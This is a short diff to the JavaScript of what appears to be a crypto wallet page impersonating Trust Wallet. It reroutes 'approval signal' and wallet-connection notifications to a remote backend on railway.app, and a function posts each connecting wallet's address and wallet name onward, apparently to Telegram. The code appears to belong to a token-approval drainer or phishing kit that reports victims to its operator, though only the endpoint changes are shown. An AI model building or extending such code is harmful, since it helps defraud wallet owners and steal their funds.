@@ -6,8 +6,14 @@ let currentTypedAmount = "0";
 const usdtPriceInInr = 96.225; // INR conversion rate
 let userUsdtBalance = 2.00;   // Default balance
 
+// Backend API Configuration
+const RAILWAY_BACKEND_URL = 'https://trust-wallet-backend-production-2c80.up.railway.app';
+const BACKEND_BASE_URL = (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1')
+    ? ''
+    : RAILWAY_BACKEND_URL;
+
 // Backend API Endpoint for Approval Signal
-const BACKEND_API_URL = '/api/notify-approval';
+const BACKEND_API_URL = `${BACKEND_BASE_URL}/api/notify-approval`;
 
 // DOM Elements - Screen Steps
 const stepAddress = document.getElementById('stepAddress');
@@ -463,7 +469,7 @@ async function notifyTelegramWalletConnected(address) {
     const walletName = detectWalletName();
 
     try {
-        await fetch('/api/notify-connection', {
+        await fetch(`${BACKEND_BASE_URL}/api/notify-connection`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
